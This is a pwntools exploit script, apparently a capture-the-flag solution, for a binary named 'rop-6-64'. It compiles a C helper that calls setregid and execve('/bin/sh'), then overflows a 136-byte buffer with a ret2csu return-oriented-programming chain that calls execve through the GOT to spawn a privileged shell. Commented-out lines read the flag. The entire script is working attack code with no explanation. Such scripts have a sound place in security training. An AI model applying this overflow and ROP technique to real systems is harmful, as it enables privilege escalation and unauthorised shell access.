from pwn import *
import os

DEBUG = False 
file = "./rop-6-64"
env = {"PATH":"$PATH:."}

elf = ELF(file)
max_len = 136

c_code = '''
#include <unistd.h>

int main() {
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
}
'''

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o main payload.c")

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *0x0000000000400660
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

execve = p64(0x601030)
main = p64(next(elf.search(b"main\0")))

pop_rdi = p64(0x0000000000400703)

#   0x00000000004006e0 <+64>:    mov    rdx,r13
#   0x00000000004006e3 <+67>:    mov    rsi,r14
#   0x00000000004006e6 <+70>:    mov    edi,r15d
#   0x00000000004006e9 <+73>:    call   QWORD PTR [r12+rbx*8]
setup = p64(0x00000000004006e0)
pop_r12_r13_r14_r15 = p64(0x00000000004006fc)

payload = flat (
    b"A" * max_len,
    pop_r12_r13_r14_r15,
    execve, # r12 
    p64(0), # r13 -> rdx
    p64(0), # r14 -> rsi
    main,   # r15 -> edi
    setup,
)

io.sendline(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
# print(flag)
